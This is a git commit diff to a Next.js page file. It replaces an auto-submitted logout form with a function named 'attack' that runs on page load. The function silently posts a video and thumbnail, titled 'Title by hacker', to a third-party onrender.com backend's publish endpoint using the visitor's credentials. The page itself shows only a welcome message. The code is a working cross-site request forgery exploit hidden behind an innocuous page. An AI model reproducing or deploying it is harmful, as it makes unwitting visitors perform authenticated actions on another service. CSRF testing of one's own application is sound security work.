3add4ac5252e3495ad54d0aa637624eaf898cd77
sumitdoescode <sumit.does.code@gmail.com>
2026-03-14 15:47:00 +0530

    hehe

--- app/page.tsx
+++ app/page.tsx
@@ -1,22 +1,30 @@
 "use client";
-import React from "react";
-import { useState, useEffect, useRef } from "react";
+import { useEffect } from "react";
 import axios from "axios";
 
-const page = () => {
-    const formRef = useRef<HTMLFormElement>(null);
+export default function Page() {
+    const attack = async () => {
+        const formData = new FormData();
+
+        formData.append("title", "Title by hacker");
+        formData.append("description", "Description by hacker");
+
+        const videoBlob = await fetch("/video.mp4").then((r) => r.blob());
+        const thumbnailBlob = await fetch("/thumbnail.jpg").then((r) => r.blob());
+
+        formData.append("videoFile", new File([videoBlob], "video.mp4"));
+        formData.append("thumbnail", new File([thumbnailBlob], "thumbnail.jpg"));
+
+        await axios.post("https://youtube-backend-9k0x.onrender.com/api/v1/video/publish", formData, { withCredentials: true });
+    };
 
     useEffect(() => {
-        formRef.current?.submit();
+        attack();
     }, []);
 
     return (
         <div>
-            <form action="https://youtube-backend-9k0x.onrender.com/api/v1/users/logout" method="POST" encType="multipart/form-data" ref={formRef}>
-                <button type="submit">Logout (via form)</button>
-            </form>
+            <h1 className="text-2xl text-white">Hello there, welcome</h1>
         </div>
     );
-};
-
-export default page;
+}
